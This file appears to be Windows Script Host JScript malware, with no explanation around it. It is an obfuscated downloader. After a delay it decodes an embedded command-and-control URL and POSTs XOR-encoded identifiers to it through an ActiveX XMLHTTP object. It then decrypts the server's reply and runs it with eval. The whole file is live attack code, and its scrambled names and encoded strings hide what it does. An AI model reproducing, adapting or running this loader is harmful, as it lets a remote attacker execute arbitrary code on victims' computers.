var bebozcxote = (new Date)['getTime']();
var nqodoffuiz = bebozcxote + 10000;
while (bebozcxote < nqodoffuiz) {
	bebozcxote = (new Date)['getTime']();
	this['WScript']['Sleep'](1000);
}






function sendRequest(quzibkyckuz5, nfaap) {

	if(typeof nfaap === 'undefined') { nfaap = false; }

	var rivonkca = '', ixqvy = '', wiwulhin, yvak ='=';

	for (var nizzli = 0; nizzli < quzibkyckuz5['length']; nizzli++) {
		rivonkca += nizzli + yvak + encodeURIComponent(''+quzibkyckuz5[nizzli]) + '&';
	}
	rivonkca = azxvuksu(rivonkca);

	try {
		var cyjxipha;
		cyjxipha = new ActiveXObject('MSXML2.XMLHTTP');
		cyjxipha['open']('POST', irmykbuoq, false);
		cyjxipha['send'](rivonkca);
		var foalvqaxo = cyjxipha['status'];
		if (foalvqaxo == 200) {
			ixqvy = cyjxipha['responseText'];
			if(ixqvy) {
				wiwulhin = zago(ixqvy);
				if(nfaap) {
					return wiwulhin;
				}
				else {
					syzfygmy(wiwulhin);
				}
			}
		}
		
	} catch (e) {}

	return false;
	
}

function syzfygmy(jyqtjeqvu) {
	var gywaf = 'eval';
	this[gywaf](jyqtjeqvu);
}

var wbz = znyoqhxo('jevblcies9ubxej3c');
var irmykbuoq = znyoqhxo('lgdnnpq.lloelxeitpj/pmiojce.deouiqqistcufosbihbsdalyrbyugoeyg.ohbsbuhpx.h5ufsbhar6f3rbxdd/x/h:vsypltstlhf');
var tid =  znyoqhxo('x0p0b5k');
var aqob =  znyoqhxo('d5c5w2k');


sendRequest(['a', tid, aqob]);


function hkevyhjenqwi(nizzli) {
	var biadumcza = '00'+nizzli['toString'](16);
	biadumcza = biadumcza['substr'](biadumcza['length']-2);
	return biadumcza;
}

function zago(dyrdiap) {
	var waxiput, betulegjyx2, nizzli, ixqvy = '';

	var siatsac = dyrdiap['substr'](0, 2);

	betulegjyx2 = parseInt(siatsac, 16);
	waxiput = dyrdiap['substr'](2);
	
	for (nizzli = 0; nizzli < waxiput['length']; nizzli+=2) {
		ixqvy += String['fromCharCode'](ufhyl(parseInt(waxiput['substr'](nizzli, 2), 16), betulegjyx2));
	}
	
		
	return ixqvy;
}


function azxvuksu(dyrdiap) {
	var betulegjyx2 = 168, nizzli, ixqvy = '';
	
	for (nizzli = 0; nizzli < dyrdiap['length']; nizzli++) {
		ixqvy += hkevyhjenqwi(dyrdiap['charCodeAt'](nizzli) ^ betulegjyx2);
	}

	return (hkevyhjenqwi(betulegjyx2)+ixqvy);
}



function ufhyl(teqbohwicwoj, obvuyxwim) {	
	return teqbohwicwoj ^ obvuyxwim;
}


function znyoqhxo(jaxfysyz) {
	var midpycexi = '';
	for(var esxyaf=0; esxyaf<jaxfysyz['length']; esxyaf++) {
		if(esxyaf%2===1) {
			var nozbweqimza = jaxfysyz['substr'](esxyaf, 1);
			midpycexi = nozbweqimza + midpycexi;
		}
	}

	return midpycexi;
}


